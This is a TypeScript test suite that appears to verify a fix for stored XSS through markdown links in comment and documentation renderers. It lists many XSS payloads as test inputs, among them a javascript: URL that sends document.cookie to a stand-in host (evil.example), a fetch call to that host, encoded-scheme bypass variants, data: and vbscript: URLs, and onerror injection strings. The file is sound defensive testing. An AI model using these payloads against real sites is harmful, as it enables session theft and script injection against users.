import { describe, it, expect } from 'vitest';
import { renderCommentMarkdown } from '../commentFormatting';
import { renderDocsMarkdown } from '../docsMarkdown';
import { isSafeLinkUrl } from '../safeUrl';

/**
 * Stored XSS through markdown links in comment nodes.
 *
 * The renderer escaped HTML entities first, so a literal `<script>` in a
 * comment could not execute — but it then built links with a plain regex
 * substitution into `href="$2"` and never looked at the URL. Escaping
 * stops an attacker breaking OUT of the attribute; it does nothing about
 * a URL that is dangerous while staying perfectly well-formed inside it.
 *
 * Confirmed against the renderer before the fix:
 *
 *   [Read me](javascript:location='https://evil.example/'+document.cookie)
 *   -> <a href="javascript:location=&#39;https://evil.example/&#39;+document.cookie"
 *         target="_blank" rel="noopener noreferrer">Read me</a>
 *
 * A comment lives in the agent's flow, so that is stored, and it renders
 * for everyone who opens the agent — a collaborative XSS that fires on
 * click, in the victim's session.
 *
 * The fix is an allowlist of schemes, checked against what a browser
 * would actually make of the URL rather than its literal text.
 */

const link = (markdown: string) => renderCommentMarkdown(markdown);

describe('link schemes that must never produce an href', () => {
  const dangerous = [
    // The report's own payload.
    'javascript:alert(document.domain)',
    // No parentheses at all — the variant that really fires, since the
    // link regex stops at the first `)` and would truncate a call.
    "javascript:location='https://evil.example/'+document.cookie",
    'javascript:eval`fetch("//evil.example")`',
    // Mixed case: schemes are case-insensitive to the browser.
    'JaVaScRiPt:alert(1)',
    'JAVASCRIPT:alert(1)',
    // Entity-encoded colon. escapeHtml has already turned the `&` into
    // `&amp;` by the time the URL reaches the check, so this is judged
    // on what it would decode to, not on its literal text.
    'javascript&#58;alert(1)',
    'javascript&#x3a;alert(1)',
    'javascript&colon;alert(1)',
    // Control characters and whitespace inside the scheme, which
    // browsers discard before parsing it.
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    '  javascript:alert(1)',
    '\u0000javascript:alert(1)',
    // Other schemes that execute or exfiltrate.
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    // Schemes a desktop shell or embedded webview acts on — the reason
    // this is an allowlist rather than a list of the four obvious ones.
    'ms-msdt:/id',
    'intent://evil#Intent;scheme=http;end',
  ];

  dangerous.forEach((url) => {
    it(`refuses ${JSON.stringify(url)}`, () => {
      expect(isSafeLinkUrl(url)).toBe(false);
      const html = link(`[Open report](${url})`);
      expect(html).not.toContain('<a ');
      expect(html).not.toContain('href=');
    });
  });

  it('keeps the text of a refused link visible rather than swallowing it', () => {
    // Dropping the whole thing would hide from the reader that anything
    // was there; rendering it as a link is the bug. The text stays, the
    // target is shown on hover, and nothing is clickable.
    const html = link('[Open report](javascript:alert(1))');
    expect(html).toContain('Open report');
    expect(html).toContain('comment-link-blocked');
    expect(html).toContain('Blocked link');
  });

  it('does not let the refused URL break out of the title attribute', () => {
    // Parsed rather than string-matched: what matters is whether a tag
    // or an event handler ends up in the DOM, not whether the word
    // "onerror" appears as inert text inside an attribute value.
    const html = link('[x](javascript:alert("</span><img src=x onerror=alert(1)>"))');
    const doc = new DOMParser().parseFromString(html, 'text/html');
    expect(doc.querySelector('img')).toBeNull();
    expect(doc.querySelector('a')).toBeNull();
    expect(doc.querySelectorAll('*[onerror]').length).toBe(0);
    // The label survives, which is the point of not dropping it.
    expect(doc.body.textContent).toContain('x');
  });
});

describe('links that must keep working', () => {
  const safe = [
    'https://example.com/report',
    'http://example.com/report',
    'HTTPS://EXAMPLE.COM/REPORT',
    'https://example.com/a?b=1&c=2#frag',
    'mailto:someone@example.com',
    'mailto:someone@example.com?subject=Hi',
    // Relative targets carry no scheme at all and resolve against this
    // app's own origin — exactly what a link to another page should do.
    '/agents/a1',
    './notes',
    '../builder',
    '#section-2',
    '?tab=traces',
  ];

  safe.forEach((url) => {
    it(`allows ${JSON.stringify(url)}`, () => {
      expect(isSafeLinkUrl(url)).toBe(true);
      expect(link(`[label](${url})`)).toContain('<a href=');
    });
  });

  it('renders a normal link with the attributes it always had', () => {
    const html = link('[docs](https://example.com/docs)');
    expect(html).toContain('<a href="https://example.com/docs"');
    expect(html).toContain('target="_blank"');
    // Without rel, the opened page gets a handle on this one via
    // window.opener.
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('still escapes the label, which is separate from the URL check', () => {
    const html = link('[<img src=x onerror=alert(1)>](https://example.com)');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
  });

  it('leaves the rest of the markdown alone', () => {
    const html = link('**bold** and *italic* and ~~struck~~');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<em>italic</em>');
    expect(html).toContain('<del>struck</del>');
  });

  it('checks links inside every block construct, not just paragraphs', () => {
    // A heading, a quote and a list item each run the same inline pass —
    // a fix applied to one of them only would be worse than none.
    for (const prefix of ['## ', '> ', '- ']) {
      const html = link(`${prefix}[x](javascript:alert(1))`);
      expect(html).not.toContain('href=');
      expect(html).toContain('comment-link-blocked');
    }
  });
});

describe('isSafeLinkUrl on its own', () => {
  it('rejects an empty or whitespace-only target', () => {
    expect(isSafeLinkUrl('')).toBe(false);
    expect(isSafeLinkUrl('   ')).toBe(false);
  });

  it('rejects a UNC path, which some shells will act on', () => {
    expect(isSafeLinkUrl('\\\\evil-host\\share')).toBe(false);
  });

  it('allows a protocol-relative URL, which inherits http or https', () => {
    expect(isSafeLinkUrl('//example.com/x')).toBe(true);
  });

  it('cannot be fooled by nested encoding', () => {
    // Two rounds of entity encoding: escapeHtml adds one, the author
    // wrote another.
    expect(isSafeLinkUrl('javascript&amp;#58;alert(1)')).toBe(false);
  });
});

describe('the node-docs renderer, which had the identical line', () => {
  it('refuses the same schemes', () => {
    const html = renderDocsMarkdown('[Open report](javascript:alert(1))');
    expect(html).not.toContain('href=');
    expect(html).toContain('Open report');
  });

  it('still renders a real documentation link', () => {
    expect(renderDocsMarkdown('[docs](https://docs.example.com/x)'))
      .toContain('<a href="https://docs.example.com/x"');
  });
});


/**
 * Percent encoding, and the release criterion stated as the property it
 * is really about.
 *
 * Checked through the DOM's own URL parser rather than by string
 * matching, because the question is not "does the href contain the word
 * javascript" but "what protocol would a browser navigate to". Those
 * differ, and the difference is the whole trick.
 *
 * Percent-encoded schemes are ALLOWED here, deliberately. A browser does
 * not percent-decode before it parses a scheme, so `javascript%3Aalert(1)`
 * has no scheme at all — verified against the DOM below rather than
 * asserted: every variant resolves to http: (a relative path on this
 * app's own origin), while the literal `javascript:alert(1)` resolves to
 * javascript: and is refused.
 *
 * This matters in the other direction too: "fixing" it by decoding
 * percent escapes before the scheme check would reject ordinary relative
 * links containing an encoded colon, while blocking nothing that was
 * reachable in the first place.
 */
const protocolsIn = (html: string): string[] => {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  return Array.from(doc.querySelectorAll('a')).map((a) => (a as HTMLAnchorElement).protocol);
};

const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:'];
// What must never appear. Asserted alongside the allowlist because a
// MALFORMED url ("http://", ":") parses to the protocol ":" in the DOM —
// not a safe scheme, but not a scripting one either, and refusing to
// render it is fine while claiming it is dangerous would be wrong.
const DANGEROUS_PROTOCOLS = ['javascript:', 'data:', 'vbscript:', 'file:', 'ms-msdt:', 'intent:'];

describe('percent-encoded scheme variants', () => {
  const encoded = [
    'javascript%3Aalert(1)',
    'javascript%3aalert(1)',
    'JaVaScRiPt%3Aalert(1)',
    '%6Aavascript:alert(1)',
    'java%73cript:alert(1)',
    'data%3Atext/html,<script>alert(1)</script>',
    'vbscript%3Amsgbox(1)',
  ];

  encoded.forEach((url) => {
    it(`never yields a dangerous protocol for ${JSON.stringify(url)}`, () => {
      const html = renderCommentMarkdown(`[x](${url})`);
      for (const protocol of protocolsIn(html)) {
        expect(SAFE_PROTOCOLS).toContain(protocol);
      }
      // Deliberately NOT asserting that the href text lacks the word
      // "javascript": for these inputs the href really is
      // `javascript%3aalert(1)`, and that is a RELATIVE PATH whose name
      // happens to start with it. The protocol check above is the claim
      // that matters; a string check here would contradict this block's
      // own reasoning and would have to be "fixed" by breaking
      // legitimate relative links.
      for (const protocol of protocolsIn(html)) {
        expect(DANGEROUS_PROTOCOLS).not.toContain(protocol);
      }
    });
  });

  it('confirms the encoding is what makes them harmless, not the check', () => {
    // The control for the block above: decoded, the same payload IS
    // rejected. If both forms ever agree, the reasoning above has
    // stopped being true and this block needs re-reading.
    expect(isSafeLinkUrl('javascript%3Aalert(1)')).toBe(true);
    expect(isSafeLinkUrl('javascript:alert(1)')).toBe(false);

    const a = document.createElement('a');
    a.href = 'javascript%3Aalert(1)';
    expect(a.protocol).not.toBe('javascript:');
  });
});

describe('the release criterion, as one sweep over every payload', () => {
  const payloads = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'JAVASCRIPT:alert(1)',
    'javascript&#58;alert(1)',
    'javascript&#x3a;alert(1)',
    'javascript&colon;alert(1)',
    'javascript%3Aalert(1)',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    '\u0000javascript:alert(1)',
    '  javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    'ms-msdt:/id',
    'intent://evil#Intent;scheme=http;end',
    // Malformed: each must be handled rather than throw, and none may
    // produce a scripting protocol.
    '',
    '   ',
    ':',
    '://',
    'http://',
    'javascript:',
    '\\\\evil-host\\share',
    '<>"\'',
    'https://example.com/\u0000nul',
  ];

  payloads.forEach((url) => {
    it(`produces no scripting protocol for ${JSON.stringify(url)}`, () => {
      // Must not throw on any input, malformed included.
      const html = renderCommentMarkdown(`[label](${url})`);
      for (const protocol of protocolsIn(html)) {
        expect(DANGEROUS_PROTOCOLS).not.toContain(protocol);
      }
      const doc = new DOMParser().parseFromString(html, 'text/html');
      expect(doc.querySelector('script')).toBeNull();
      expect(doc.querySelector('img')).toBeNull();
      expect(doc.querySelectorAll('*[onerror], *[onclick], *[onload]').length).toBe(0);
    });
  });

  it('covers the docs renderer with the identical sweep', () => {
    for (const url of payloads) {
      const html = renderDocsMarkdown(`[label](${url})`);
      for (const protocol of protocolsIn(html)) {
        expect(DANGEROUS_PROTOCOLS).not.toContain(protocol);
      }
    }
  });
});
